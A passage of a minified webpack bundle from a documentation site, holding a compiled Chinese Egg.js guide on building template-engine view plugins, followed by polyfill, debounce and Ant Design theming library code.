",r.a.createElement("code",null,"render")," \u65b9\u6cd5\u4f20\u5165\u7684\u3002\u6846\u67b6\u8fd8\u5185\u7f6e\u4e86 ",r.a.createElement("code",null,"ctx"),"\uff0c",r.a.createElement("code",null,"request"),", ",r.a.createElement("code",null,"ctx.helper")," \u8fd9\u51e0\u4e2a\u5bf9\u8c61\u3002"),r.a.createElement("li",null,"viewOptions: \u7528\u6237\u4f20\u5165\u7684\u914d\u7f6e\uff0c\u53ef\u8986\u76d6\u6a21\u677f\u5f15\u64ce\u7684\u9ed8\u8ba4\u914d\u7f6e\uff0c\u8fd9\u4e2a\u53ef\u6839\u636e\u6a21\u677f\u5f15\u64ce\u7684\u7279\u5f81\u8003\u8651\u662f\u5426\u652f\u6301\u3002\u6bd4\u5982\u9ed8\u8ba4\u5f00\u542f\u4e86\u7f13\u5b58\uff0c\u800c\u67d0\u4e2a\u9875\u9762\u4e0d\u9700\u8981\u7f13\u5b58\u3002")),r.a.createElement("p",null,r.a.createElement("code",null,"renderString")," \u65b9\u6cd5\u7684\u4e09\u4e2a\u53c2\u6570"),r.a.createElement("ul",null,r.a.createElement("li",null,"tpl: \u6a21\u677f\u5b57\u7b26\u4e32\uff0c\u6ca1\u6709\u6587\u4ef6\u8def\u5f84\u3002"),r.a.createElement("li",null,"locals: \u540c ",r.a.createElement("code",null,"render"),"\u3002"),r.a.createElement("li",null,"viewOptions: \u540c ",r.a.createElement("code",null,"render"),"\u3002")),r.a.createElement("h2",{id:"\u63d2\u4ef6\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6\u914d\u7f6e"),r.a.createElement("p",null,"\u6839\u636e\u4e0a\u9762\u7684\u547d\u540d\u7ea6\u5b9a\uff0c\u914d\u7f6e\u540d\u4e00\u822c\u4e3a\u6a21\u677f\u5f15\u64ce\u7684\u540d\u5b57\uff0c\u6bd4\u5982 ejs\u3002"),r.a.createElement("p",null,"\u63d2\u4ef6\u7684\u914d\u7f6e\u4e3b\u8981\u6765\u81ea\u6a21\u677f\u5f15\u64ce\u7684\u914d\u7f6e\uff0c\u53ef\u6839\u636e\u5177\u4f53\u60c5\u51b5\u5b9a\u4e49\u914d\u7f6e\u9879\uff0c\u5982 ",r.a.createElement(l["Link"],{to:"https://github.com/mde/ejs#options"},"ejs \u7684\u914d\u7f6e"),"\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  ejs: {\n    cache: true,\n  },\n};",lang:"js"}),r.a.createElement("h3",{id:"helper"},r.a.createElement(l["AnchorLink"],{to:"#helper","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"helper"),r.a.createElement("p",null,"\u6846\u67b6\u672c\u8eab\u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,"ctx.helper")," \u4f9b\u5f00\u53d1\u8005\u4f7f\u7528\uff0c\u4f46\u6709\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5e0c\u671b\u5bf9 helper \u65b9\u6cd5\u8fdb\u884c\u8986\u76d6\uff0c\u4ec5\u5728\u6a21\u677f\u6e32\u67d3\u65f6\u751f\u6548\u3002"),r.a.createElement("p",null,"\u5728\u6a21\u677f\u6e32\u67d3\u4e2d\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u9700\u8981\u8f93\u51fa\u7528\u6237\u63d0\u4f9b\u7684 html \u7247\u6bb5\uff0c\u901a\u5e38\u9700\u8981\u4f7f\u7528 ",r.a.createElement("code",null,"egg-security")," \u63d2\u4ef6\u63d0\u4f9b\u7684 ",r.a.createElement("code",null,"helper.shtml")," \u6e05\u6d17\u4e0b"),r.a.createElement(o["a"],{code:"<div>{{ helper.shtml(data.content) | safe }}</div>",lang:"html"}),r.a.createElement("p",null,"\u4f46\u5982\u4e0a\u4ee3\u7801\u6240\u793a\uff0c\u6211\u4eec\u9700\u8981\u52a0\u4e0a ",r.a.createElement("code",null," | safe")," \u6765\u544a\u77e5\u6a21\u677f\u5f15\u64ce\uff0c\u8be5 html \u662f\u5b89\u5168\u7684\uff0c\u65e0\u9700\u518d\u6b21 ",r.a.createElement("code",null,"escape"),"\uff0c\u76f4\u63a5\u6e32\u67d3\u3002"),r.a.createElement("p",null,"\u800c\u8fd9\u6837\u7528\u8d77\u6765\u6bd4\u8f83\u9ebb\u70e6\uff0c\u800c\u4e14\u5bb9\u6613\u9057\u5fd8\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c01\u88c5\u4e0b\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5148\u63d0\u4f9b\u4e00\u4e2a helper \u5b50\u7c7b\uff1a")),r.a.createElement(o["a"],{code:"// {plugin_root}/lib/helper.js\nmodule.exports = (app) => {\n  return class ViewHelper extends app.Helper {\n    // safe \u7531 [egg-view-nunjucks] \u6ce8\u5165\uff0c\u5728\u6e32\u67d3\u65f6\u4e0d\u4f1a\u8f6c\u4e49\uff0c\n    // \u5426\u5219\u5728\u6a21\u677f\u8c03\u7528 shtml \u4f1a\u88ab\u8f6c\u4e49\n    shtml(str) {\n      return this.safe(super.shtml(str));\n    }\n  };\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5728\u6e32\u67d3\u65f6\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684 helper")),r.a.createElement(o["a"],{code:"// {plugin_root}/lib/view.js\nconst ViewHelper = require('./helper');\n\nmodule.exports = class MyCustomView {\n  render(filename, locals) {\n    locals.helper = new ViewHelper(this.ctx);\n\n    // \u8c03\u7528 Nunjucks render\n  }\n};",lang:"js"}),r.a.createElement("p",null,"\u5177\u4f53\u4ee3\u7801\u53ef",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-nunjucks/blob/2ee5ee992cfd95bc0bb5b822fbd72a6778edb118/lib/view.js#L11"},"\u67e5\u770b")),r.a.createElement("h3",{id:"\u5b89\u5168\u76f8\u5173"},r.a.createElement(l["AnchorLink"],{to:"#\u5b89\u5168\u76f8\u5173","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b89\u5168\u76f8\u5173"),r.a.createElement("p",null,"\u6a21\u677f\u548c\u5b89\u5168\u606f\u606f\u76f8\u5173\uff0c",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-security"},"egg-security")," \u4e5f\u7ed9\u6a21\u677f\u63d0\u4f9b\u4e86\u4e00\u4e9b\u65b9\u6cd5\uff0c\u6a21\u677f\u5f15\u64ce\u53ef\u4ee5\u6839\u636e\u9700\u6c42\u4f7f\u7528\u3002"),r.a.createElement("p",null,"\u9996\u5148\u58f0\u660e\u5bf9 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-security"},"egg-security")," \u7684\u4f9d\u8d56\uff1a"),r.a.createElement(o["a"],{code:'{\n  "name": "egg-view-nunjucks",\n  "eggPlugin": {\n    "name": "nunjucks",\n    "dep": ["security"]\n  }\n}',lang:"json"}),r.a.createElement("p",null,"\u6b64\u5916\uff0c\u6846\u67b6\u63d0\u4f9b\u4e86 ",r.a.createElement(l["AnchorLink"],{to:"../core/security#appinjectcsrfstr"},"app.injectCsrf")," \u548c ",r.a.createElement(l["AnchorLink"],{to:"../core/security#appinjectnoncestr"},"app.injectNonce"),"\uff0c\u66f4\u591a\u53ef\u67e5\u770b",r.a.createElement(l["Link"],{to:"../core/security"},"\u5b89\u5168\u7ae0\u8282"),"\u3002"),r.a.createElement("h3",{id:"\u5355\u5143\u6d4b\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#\u5355\u5143\u6d4b\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5355\u5143\u6d4b\u8bd5"),r.a.createElement("p",null,"\u4f5c\u4e3a\u4e00\u4e2a\u9ad8\u8d28\u91cf\u7684\u63d2\u4ef6\uff0c\u5b8c\u5584\u7684\u5355\u5143\u6d4b\u8bd5\u662f\u5fc5\u4e0d\u53ef\u5c11\u7684\uff0c\u6211\u4eec\u4e5f\u63d0\u4f9b\u4e86\u5f88\u591a\u8f85\u52a9\u5de5\u5177\u4f7f\u63d2\u4ef6\u5f00\u53d1\u8005\u53ef\u4ee5\u65e0\u75db\u7684\u7f16\u5199\u6d4b\u8bd5\uff0c\u5177\u4f53\u53c2\u89c1",r.a.createElement(l["Link"],{to:"../core/unittest"},"\u5355\u5143\u6d4b\u8bd5"),"\u548c",r.a.createElement(l["Link"],{to:"./plugin"},"\u63d2\u4ef6"),"\u4e2d\u7684\u76f8\u5173\u5185\u5bb9\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},rj5E:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null)}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(o,{demos:n})}},rrvk:function(e,t,n){},rwYS:function(e,t,n){"use strict";var a=n("0mt+"),r=n("A0UU"),l=n("V3tB"),o=n("m4/z"),i=n("9Rcy"),c=n("XS8S"),s=n("ysnP"),u=n("Xdqv"),d=n("31yA"),m=n("YtQ9"),p=n("a7jj"),h=n("oyD1"),g=n("m/os"),f=n("AcHn"),E=n("PE5i"),b=n("aGbw"),v=n("tbdv"),y=n("qUkb"),k=n("TVTq"),w=n("eap/"),x=n("1+Tz"),j=n("vr25"),S=n("u3TI"),C=n("bUpX"),A=n("XExY"),L=n("AzF/"),T=n("jAHp"),N=n("VPwr"),O=n("pX0n"),I=n("vbCh"),P=n("q7Pv"),R=n("fbrm"),_=n("WM7W"),q=n("oi/H"),M=n("lz/I"),F=n("x5+g").forEach,D=N("hidden"),U="Symbol",z="prototype",H=P("toPrimitive"),B=M.set,W=M.getterFor(U),V=Object[z],$=r.Symbol,G=l("JSON","stringify"),X=j.f,Q=S.f,K=w.f,J=C.f,Y=T("symbols"),Z=T("op-symbols"),ee=T("string-to-symbol-registry"),te=T("symbol-to-string-registry"),ne=T("wks"),ae=r.QObject,re=!ae||!ae[z]||!ae[z].findChild,le=i&&u((function(){return 7!=v(Q({},"a",{get:function(){return Q(this,"a",{value:7}).a}})).a}))?function(e,t,n){var a=X(V,t);a&&delete V[t],Q(e,t,n),a&&e!==V&&Q(V,t,a)}:Q,oe=function(e,t){var n=Y[e]=v($[z]);return B(n,{type:U,tag:e,description:t}),i||(n.description=t),n},ie=s?function(e){return"symbol"==typeof e}:function(e){return Object(e)instanceof $},ce=function(e,t,n){e===V&&ce(Z,t,n),h(e);var a=E(t,!0);return h(n),d(Y,a)?(n.enumerable?(d(e,D)&&e[D][a]&&(e[D][a]=!1),n=v(n,{enumerable:b(0,!1)})):(d(e,D)||Q(e,D,b(1,{})),e[D][a]=!0),le(e,a,n)):Q(e,a,n)},se=function(e,t){h(e);var n=f(t),a=y(n).concat(he(n));return F(a,(function(t){i&&!de.call(n,t)||ce(e,t,n[t])})),e},ue=function(e,t){return void 0===t?v(e):se(v(e),t)},de=function(e){var t=E(e,!0),n=J.call(this,t);return!(this===V&&d(Y,t)&&!d(Z,t))&&(!(n||!d(this,t)||!d(Y,t)||d(this,D)&&this[D][t])||n)},me=function(e,t){var n=f(e),a=E(t,!0);if(n!==V||!d(Y,a)||d(Z,a)){var r=X(n,a);return!r||!d(Y,a)||d(n,D)&&n[D][a]||(r.enumerable=!0),r}},pe=function(e){var t=K(f(e)),n=[];return F(t,(function(e){d(Y,e)||d(O,e)||n.push(e)})),n},he=function(e){var t=e===V,n=K(t?Z:f(e)),a=[];return F(n,(function(e){!d(Y,e)||t&&!d(V,e)||a.push(Y[e])})),a};if(c||($=function(){if(this instanceof $)throw TypeError("Symbol is not a constructor");var e=arguments.length&&void 0!==arguments[0]?String(arguments[0]):void 0,t=I(e),n=function(e){this===V&&n.call(Z,e),d(this,D)&&d(this[D],t)&&(this[D][t]=!1),le(this,t,b(1,e))};return i&&re&&le(V,t,{configurable:!0,set:n}),oe(t,e)},L($[z],"toString",(function(){return W(this).tag})),L($,"withoutSetter",(function(e){return oe(I(e),e)})),C.f=de,S.f=ce,j.f=me,k.f=w.f=pe,x.f=he,R.f=function(e){return oe(P(e),e)},i&&(Q($[z],"description",{configurable:!0,get:function(){return W(this).description}}),o||L(V,"propertyIsEnumerable",de,{unsafe:!0}))),a({global:!0,wrap:!0,forced:!c,sham:!c},{Symbol:$}),F(y(ne),(function(e){_(e)})),a({target:U,stat:!0,forced:!c},{for:function(e){var t=String(e);if(d(ee,t))return ee[t];var n=$(t);return ee[t]=n,te[n]=t,n},keyFor:function(e){if(!ie(e))throw TypeError(e+" is not a symbol");if(d(te,e))return te[e]},useSetter:function(){re=!0},useSimple:function(){re=!1}}),a({target:"Object",stat:!0,forced:!c,sham:!i},{create:ue,defineProperty:ce,defineProperties:se,getOwnPropertyDescriptor:me}),a({target:"Object",stat:!0,forced:!c},{getOwnPropertyNames:pe,getOwnPropertySymbols:he}),a({target:"Object",stat:!0,forced:u((function(){x.f(1)}))},{getOwnPropertySymbols:function(e){return x.f(g(e))}}),G){var ge=!c||u((function(){var e=$();return"[null]"!=G([e])||"{}"!=G({a:e})||"{}"!=G(Object(e))}));a({target:"JSON",stat:!0,forced:ge},{stringify:function(e,t,n){var a,r=[e],l=1;while(arguments.length>l)r.push(arguments[l++]);if(a=t,(p(t)||void 0!==e)&&!ie(e))return m(t)||(t=function(e,t){if("function"==typeof a&&(t=a.call(this,e,t)),!ie(t))return t}),r[1]=t,G.apply(null,r)}})}$[z][H]||A($[z],H,$[z].valueOf),q($,U),O[D]=!0},s5yy:function(e,t,n){(function(t){var n="Expected a function",a=NaN,r="[object Symbol]",l=/^\s+|\s+$/g,o=/^[-+]0x[0-9a-f]+$/i,i=/^0b[01]+$/i,c=/^0o[0-7]+$/i,s=parseInt,u="object"==typeof t&&t&&t.Object===Object&&t,d="object"==typeof self&&self&&self.Object===Object&&self,m=u||d||Function("return this")(),p=Object.prototype,h=p.toString,g=Math.max,f=Math.min,E=function(){return m.Date.now()};function b(e,t,a){var r,l,o,i,c,s,u=0,d=!1,m=!1,p=!0;if("function"!=typeof e)throw new TypeError(n);function h(t){var n=r,a=l;return r=l=void 0,u=t,i=e.apply(a,n),i}function b(e){return u=e,c=setTimeout(x,t),d?h(e):i}function y(e){var n=e-s,a=e-u,r=t-n;return m?f(r,o-a):r}function k(e){var n=e-s,a=e-u;return void 0===s||n>=t||n<0||m&&a>=o}function x(){var e=E();if(k(e))return j(e);c=setTimeout(x,y(e))}function j(e){return c=void 0,p&&r?h(e):(r=l=void 0,i)}function S(){void 0!==c&&clearTimeout(c),u=0,r=s=l=c=void 0}function C(){return void 0===c?i:j(E())}function A(){var e=E(),n=k(e);if(r=arguments,l=this,s=e,n){if(void 0===c)return b(s);if(m)return c=setTimeout(x,t),h(s)}return void 0===c&&(c=setTimeout(x,t)),i}return t=w(t)||0,v(a)&&(d=!!a.leading,m="maxWait"in a,o=m?g(w(a.maxWait)||0,t):o,p="trailing"in a?!!a.trailing:p),A.cancel=S,A.flush=C,A}function v(e){var t=typeof e;return!!e&&("object"==t||"function"==t)}function y(e){return!!e&&"object"==typeof e}function k(e){return"symbol"==typeof e||y(e)&&h.call(e)==r}function w(e){if("number"==typeof e)return e;if(k(e))return a;if(v(e)){var t="function"==typeof e.valueOf?e.valueOf():e;e=v(t)?t+"":t}if("string"!=typeof e)return 0===e?e:+e;e=e.replace(l,"");var n=i.test(e);return n||c.test(e)?s(e.slice(2),n?2:8):o.test(e)?a:+e}e.exports=b}).call(this,n("CwJZ"))},s97C:function(e,t,n){"use strict";var a=n("0mt+"),r=n("NBU9"),l=n("XaNN");a({target:"Map",stat:!0},{groupBy:function(e,t){var n=new this;l(t);var a=l(n.has),o=l(n.get),i=l(n.set);return r(e,(function(e){var r=t(e);a.call(n,r)?o.call(n,r).push(e):i.call(n,r,[e])})),n}})},"sA+K":function(e,t,n){"use strict";function a(){var e=n("FU0I");return a=function(){return e},e}function r(){var e=l(n("lVej"));return r=function(){return e},e}function l(e){return e&&e.__esModule?e:{default:e}}function o(e,t){return d(e)||u(e,t)||c(e,t)||i()}function i(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function c(e,t){if(e){if("string"===typeof e)return s(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?s(e,t):void 0}}function s(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function u(e,t){var n=null==e?null:"undefined"!=typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l,o,i=[],c=!0,s=!1;try{if(l=(n=n.call(e)).next,0===t){if(Object(n)!==n)return;c=!1}else for(;!(c=(a=l.call(n)).done)&&(i.push(a.value),i.length!==t);c=!0);}catch(u){s=!0,r=u}finally{try{if(!c&&null!=n["return"]&&(o=n["return"](),Object(o)!==o))return}finally{if(s)throw r}}return i}}function d(e){if(Array.isArray(e))return e}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=void 0;var m=function(){var e=(0,a().useState)(),t=o(e,2),n=t[0],l=t[1],i=(0,a().useState)("ready"),c=o(i,2),s=c[0],u=c[1],d=(0,a().useCallback)((function(e){(0,r()["default"])(e),u("copied"),clearTimeout(n),l(setTimeout((function(){u("ready")}),2e3))}),[]);return[d,s]};t["default"]=m},sAEC:function(e,t,n){"use strict";n.d(t,"b",(function(){return U}));var a=n("2EJr"),r=n("CUYM"),l=n("u9Ur"),o=n("E5p8"),i=n("FU0I"),c=n("cGTW"),s=Object(a["a"])({},c["a"].Modal);function u(e){s=e?Object(a["a"])(Object(a["a"])({},s),e):Object(a["a"])({},c["a"].Modal)}var d=n("nrCb"),m="internalMark",p=function(e){var t=e.locale,n=void 0===t?{}:t,r=e.children;e._ANT_MARK__;i["useEffect"]((function(){return u(n&&n.Modal),function(){u()}}),[n]);var l=i["useMemo"]((function(){return Object(a["a"])(Object(a["a"])({},n),{exist:!0})}),[n]);return i["createElement"](d["a"].Provider,{value:l},r)},h=p,g=n("EAg7"),f=n("zKj5"),E=n("7gyq"),b=n("2HmL"),v=n("aH0x"),y=n("hUmh"),k=n("2Y+i"),w=n("bOsn"),x=n("Lcxk"),j=function(){function e(t,n){var a;if(void 0===t&&(t=""),void 0===n&&(n={}),t instanceof e)return t;"number"===typeof t&&(t=Object(y["d"])(t)),this.originalInput=t;var r=Object(w["a"])(t);this.originalInput=t,this.r=r.r,this.g=r.g,this.b=r.b,this.a=r.a,this.roundA=Math.round(100*this.a)/100,this.format=null!==(a=n.format)&&void 0!==a?a:r.format,this.gradientType=n.gradientType,this.r<1&&(this.r=Math.round(this.r)),this.g<1&&(this.g=Math.round(this.g)),this.b<1&&(this.b=Math.round(this.b)),this.isValid=r.ok}return e.prototype.isDark=function(){return this.getBrightness()<128},e.prototype.isLight=function(){return!this.isDark()},e.prototype.getBrightness=function(){var e=this.toRgb();return(299*e.r+587*e.g+114*e.b)/1e3},e.prototype.getLuminance=function(){var e,t,n,a=this.toRgb(),r=a.r/255,l=a.g/255,o=a.b/255;return e=r<=.03928?r/12.92:Math.pow((r+.055)/1.055,2.4),t=l<=.03928?l/12.92:Math.pow((l+.055)/1.055,2.4),n=o<=.03928?o/12.92:Math.pow((o+.055)/1.055,2.4),.2126*e+.7152*t+.0722*n},e.prototype.getAlpha=function(){return this.a},e.prototype.setAlpha=function(e){return this.a=Object(x["b"])(e),this.roundA=Math.round(100*this.a)/100,this},e.prototype.isMonochrome=function(){var e=this.toHsl().s;return 0===e},e.prototype.toHsv=function(){var e=Object(y["h"])(this.r,this.g,this.b);return{h:360*e.h,s:e.s,v:e.v,a:this.a}},e.prototype.toHsvString=function(){var e=Object(y["h"])(this.r,this.g,this.b),t=Math.round(360*e.h),n=Math.round(100*e.s),a=Math.round(100*e.v);return 1===this.a?"hsv(".concat(t,", ").concat(n,"%, ").concat(a,"%)"):"hsva(".concat(t,", ").concat(n,"%, ").concat(a,"%, ").concat(this.roundA,")")},e.prototype.toHsl=function(){var e=Object(y["g"])(this.r,this.g,this.b);return{h:360*e.h,s:e.s,l:e.l,a:this.a}},e.prototype.toHslString=function(){var e=Object(y["g"])(this.r,this.g,this.b),t=Math.round(360*e.h),n=Math.round(100*e.s),a=Math.round(100*e.l);return 1===this.a?"hsl(".concat(t,", ").concat(n,"%, ").concat(a,"%)"):"hsla(".concat(t,", ").concat(n,"%, ").concat(a,"%, ").concat(this.roundA,")")},e.prototype.toHex=function(e){return void 0===e&&(e=!1),Object(y["f"])(this.r,this.g,this.b,e)},e.prototype.toHexString=function(e){return void 0===e&&(e=!1),"#"+this.toHex(e)},e.prototype.toHex8=function(e){return void 0===e&&(e=!1),Object(y["j"])(this.r,this.g,this.b,this.a,e)},e.prototype.toHex8String=function(e){return void 0===e&&(e=!1),"#"+this.toHex8(e)},e.prototype.toHexShortString=function(e){return void 0===e&&(e=!1),1===this.a?this.toHexString(e):this.toHex8String(e)},e.prototype.toRgb=function(){return{r:Math.round(this.r),g:Math.round(this.g),b:Math.round(this.b),a:this.a}},e.prototype.toRgbString=function(){var e=Math.round(this.r),t=Math.round(this.g),n=Math.round(this.b);return 1===this.a?"rgb(".concat(e,", ").concat(t,", ").concat(n,")"):"rgba(".concat(e,", ").concat(t,", ").concat(n,", ").concat(this.roundA,")")},e.prototype.toPercentageRgb=function(){var e=function(e){return"".concat(Math.round(100*Object(x["a"])(e,255)),"%")};return{r:e(this.r),g:e(this.g),b:e(this.b),a:this.a}},e.prototype.toPercentageRgbString=function(){var e=function(e){return Math.round(100*Object(x["a"])(e,255))};return 1===this.a?"rgb(".concat(e(this.r),"%, ").concat(e(this.g),"%, ").concat(e(this.b),"%)"):"rgba(".concat(e(this.r),"%, ").concat(e(this.g),"%, ").concat(e(this.b),"%, ").concat(this.roundA,")")},e.prototype.toName=function(){if(0===this.a)return"transparent";if(this.a<1)return!1;for(var e="#"+Object(y["f"])(this.r,this.g,this.b,!1),t=0,n=Object.entries(k["a"]);t<n.length;t++){var a=n[t],r=a[0],l=a[1];if(e===l)return r}return!1},e.prototype.toString=function(e){var t=Boolean(e);e=null!==e&&void 0!==e?e:this.format;var n=!1,a=this.a<1&&this.a>=0,r=!t&&a&&(e.startsWith("hex")||"name"===e);return r?"name"===e&&0===this.a?this.toName():this.toRgbString():("rgb"===e&&(n=this.toRgbString()),"prgb"===e&&(n=this.toPercentageRgbString()),"hex"!==e&&"hex6"!==e||(n=this.toHexString()),"hex3"===e&&(n=this.toHexString(!0)),"hex4"===e&&(n=this.toHex8String(!0)),"hex8"===e&&(n=this.toHex8String()),"name"===e&&(n=this.toName()),"hsl"===e&&(n=this.toHslString()),"hsv"===e&&(n=this.toHsvString()),n||this.toHexString())},e.prototype.toNumber=function(){return(Math.round(this.r)<<16)+(Math.round(this.g)<<8)+Math.round(this.b)},e.prototype.clone=function(){return new e(this.toString())},e.prototype.lighten=function(t){void 0===t&&(t=10);var n=this.toHsl();return n.l+=t/100,n.l=Object(x["c"])(n.l),new e(n)},e.prototype.brighten=function(t){void 0===t&&(t=10);var n=this.toRgb();return n.r=Math.max(0,Math.min(255,n.r-Math.round(-t/100*255))),n.g=Math.max(0,Math.min(255,n.g-Math.round(-t/100*255))),n.b=Math.max(0,Math.min(255,n.b-Math.round(-t/100*255))),new e(n)},e.prototype.darken=function(t){void 0===t&&(t=10);var n=this.toHsl();return n.l-=t/100,n.l=Object(x["c"])(n.l),new e(n)},e.prototype.tint=function(e){return void 0===e&&(e=10),this.mix("white",e)},e.prototype.shade=function(e){return void 0===e&&(e=10),this.mix("black",e)},e.prototype.desaturate=function(t){void 0===t&&(t=10);var n=this.toHsl();return n.s-=t/100,n.s=Object(x["c"])(n.s),new e(n)},e.prototype.saturate=function(t){void 0===t&&(t=10);var n=this.toHsl();return n.s+=t/100,n.s=Object(x["c"])(n.s),new e(n)},e.prototype.greyscale=function(){return this.desaturate(100)},e.prototype.spin=function(t){var n=this.toHsl(),a=(n.h+t)%360;return n.h=a<0?360+a:a,new e(n)},e.prototype.mix=function(t,n){void 0===n&&(n=50);var a=this.toRgb(),r=new e(t).toRgb(),l=n/100,o={r:(r.r-a.r)*l+a.r,g:(r.g-a.g)*l+a.g,b:(r.b-a.b)*l+a.b,a:(r.a-a.a)*l+a.a};return new e(o)},e.prototype.analogous=function(t,n){void 0===t&&(t=6),void 0===n&&(n=30);var a=this.toHsl(),r=360/n,l=[this];for(a.h=(a.h-(r*t>>1)+720)%360;--t;)a.h=(a.h+r)%360,l.push(new e(a));return l},e.prototype.complement=function(){var t=this.toHsl();return t.h=(t.h+180)%360,new e(t)},e.prototype.monochromatic=function(t){void 0===t&&(t=6);var n=this.toHsv(),a=n.h,r=n.s,l=n.v,o=[],i=1/t;while(t--)o.push(new e({h:a,s:r,v:l})),l=(l+i)%1;return o},e.prototype.splitcomplement=function(){var t=this.toHsl(),n=t.h;return[this,new e({h:(n+72)%360,s:t.s,l:t.l}),new e({h:(n+216)%360,s:t.s,l:t.l})]},e.prototype.onBackground=function(t){var n=this.toRgb(),a=new e(t).toRgb(),r=n.a+a.a*(1-n.a);return new e({r:(n.r*n.a+a.r*a.a*(1-n.a))/r,g:(n.g*n.a+a.g*a.a*(1-n.a))/r,b:(n.b*n.a+a.b*a.a*(1-n.a))/r,a:r})},e.prototype.triad=function(){return this.polyad(3)},e.prototype.tetrad=function(){return this.polyad(4)},e.prototype.polyad=function(t){for(var n=this.toHsl(),a=n.h,r=[this],l=360/t,o=1;o<t;o++)r.push(new e({h:(a+o*l)%360,s:n.s,l:n.l}));return r},e.prototype.equals=function(t){return this.toRgbString()===new e(t).toRgbString()},e}();var S=n("d9lq"),C=n("4dIG"),A="-ant-".concat(Date.now(),"-").concat(Math.random());function L(e,t){var n={},a=function(e,t){var n=e.clone();return n=(null===t||void 0===t?void 0:t(n))||n,n.toRgbString()},r=function(e,t){var r=new j(e),l=Object(v["a"])(r.toRgbString());n["".concat(t,"-color")]=a(r),n["".concat(t,"-color-disabled")]=l[1],n["".concat(t,"-color-hover")]=l[4],n["".concat(t,"-color-active")]=l[6],n["".concat(t,"-color-outline")]=r.clone().setAlpha(.2).toRgbString(),n["".concat(t,"-color-deprecated-bg")]=l[0],n["".concat(t,"-color-deprecated-border")]=l[2]};if(t.primaryColor){r(t.primaryColor,"primary");var l=new j(t.primaryColor),o=Object(v["a"])(l.toRgbString());o.forEach((function(e,t){n["primary-".concat(t+1)]=e})),n["primary-color-deprecated-l-35"]=a(l,(function(e){return e.lighten(35)})),n["primary-color-deprecated-l-20"]=a(l,(function(e){return e.lighten(20)})),n["primary-color-deprecated-t-20"]=a(l,(function(e){return e.tint(20)})),n["primary-color-deprecated-t-50"]=a(l,(function(e){return e.tint(50)})),n["primary-color-deprecated-f-12"]=a(l,(function(e){return e.setAlpha(.12*e.getAlpha())}));var i=new j(o[0]);n["primary-color-active-deprecated-f-30"]=a(i,(function(e){return e.setAlpha(.3*e.getAlpha())})),n["primary-color-active-deprecated-d-02"]=a(i,(function(e){return e.darken(2)}))}t.successColor&&r(t.successColor,"success"),t.warningColor&&r(t.warningColor,"warning"),t.errorColor&&r(t.errorColor,"error"),t.infoColor&&r(t.infoColor,"info");var c=Object.keys(n).map((function(t){return"--".concat(e,"-").concat(t,": ").concat(n[t],";")}));return"\n  :root {\n    ".concat(c.join("\n"),"\n  }\n  ").trim()}function T(e,t){var n=L(e,t);Object(S["a"])()&&Object(C["a"])(n,"".concat(A,"-dynamic-theme"))}var N,O,I=n("ulzO"),P=n("qX4T"),R=["getTargetContainer","getPopupContainer","renderEmpty","pageHeader","input","pagination","form"],_="ant",q="anticon";function M(){return N||_}function F(){return O||q}var D=function(e){var t=e.prefixCls,n=e.iconPrefixCls,a=e.theme;void 0!==t&&(N=t),void 0!==n&&(O=n),a&&T(M(),a)},U=function(){return{getPrefixCls:function(e,t){return t||(e?"".concat(M(),"-").concat(e):M())},getIconPrefixCls:F,getRootPrefixCls:function(e,t){return e||(N||(t&&t.includes("-")?t.replace(/^(.*)-[^-]*$/,"$1"):M()))}}},z=function(e){var t,n,s=e.children,u=e.csp,d=e.autoInsertSpaceInButton,p=e.form,g=e.locale,f=e.componentSize,E=e.direction,v=e.space,y=e.virtual,k=e.dropdownMatchSelectWidth,w=e.legacyLocale,x=e.parentContext,j=e.iconPrefixCls,S=e.componentDisabled,C=i["useCallback"]((function(t,n){var a=e.prefixCls;if(n)return n;var r=a||x.getPrefixCls("");return t?"".concat(r,"-").concat(t):r}),[x.getPrefixCls,e.prefixCls]),A=Object(a["a"])(Object(a["a"])({},x),{csp:u,autoInsertSpaceInButton:d,locale:g||w,direction:E,space:v,virtual:y,dropdownMatchSelectWidth:k,getPrefixCls:C});R.forEach((function(t){var n=e[t];n&&(A[t]=n)}));var 